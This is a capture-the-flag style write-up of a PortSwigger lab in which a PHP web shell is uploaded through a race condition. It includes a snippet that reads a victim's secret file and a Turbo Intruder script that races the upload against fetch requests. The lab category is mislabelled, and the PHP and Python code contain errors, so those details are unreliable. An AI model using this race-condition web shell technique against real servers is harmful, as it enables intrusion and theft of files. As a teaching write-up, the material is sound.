#  Web shell upload via race condition

## 📌 Lab Details
- **Title**: Web shell upload via race condition
- **Difficulty**: Practitioner
- **Category**: Insecure Deserialization
- **Lab URL**: https://portswigger.net/academy/labs/launch/e7c14c1093f823154152c9ce425959ef67d62c9bb7c65eb02f6a8a597ab993e8?referrer=%2fweb-security%2ffile-upload%2flab-file-upload-web-shell-upload-via-race-condition

## 🔍 Summary
The application allows users to upload avatar images. Although uploaded files are validated using antivirus and file-extension checks, the validation occurs **after** the file has already been moved into a web-accessible directory.
This creates a **race condition** where a malicious PHP file exists temporarily on the server before being deleted.

## 🛠 Steps to Solve
1. Log in and upload an image as your avatar.
2. Notice that your image was fetched using a `GET` request `/files/avatars/<IMAGE>`.
3. On your system, create a file called exploit.php containing a script for fetching the contents of Carlos's secret. For example:
   ```sh
   <? php file_get_contents('/home/carlos/secret'); ?>
   ```
4. Log in and attempt to upload the script as your avatar. Observe that the server appears to successfully prevent you from uploading files that aren't images, even if you try using some of the techniques you've learned in previous labs.
5. Send the `POST /my-account/avatar` request to **Turbo Intruder**.
6. Use the following script template:
   ```sh
   def queueRequests(target, wordlists):
       engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)

       request1 = '''<YOUR-POST-REQUEST>'''

       request2 = '''<YOUR-GET-REQUEST>'''

        # the 'gate' argument blocks the final byte of each request until openGate is invoked
        engine.queue(request1, gate='race1')
        for x in range(5):
            engine.queue(request2, gate='race1')

        # wait until every 'race1' tagged request is ready
        # then send the final byte of each request
        # (this method is non-blocking, just like queue)
        engine.openGate('race1')

        engine.complete(timeout=60)


   def handleResponse(req, interesting):
        table.add(req)
   ```
7. In the script, replace `<YOUR-POST-REQUEST>` with the entire `POST /my-account/avatar` request containing your `exploit.php` file and the `<YOUR-GET-REQUEST>` with a `GET` request for fetching your uploaded PHP file.
8. Click **Attack** at the bottom of the **Turbo Intruder** to run the script.
9. The `GET` request with a **200** response will contain the secret, as this is the request which hit the server after the PHP file was uploaded, but before it failed validation and was deleted.

## 📖 Key Takeaways
- Validation order matters.
- Temporary exposure can still be exploitable.
- Race conditions can bypass otherwise strong defenses.
- Turbo Intruder is extremely powerful for timing attacks.

## 🖼️ Screenshot
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/8be7d590-e924-4ba9-8a27-0cebbc0bc9ae" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/625443ea-9160-4e97-a120-eb8b0df1f4f4" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/12bdd1cb-02e2-4db1-b1e8-0e119cb61faa" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/2b747e33-e396-4c9d-82f7-096c0637bc0d" />
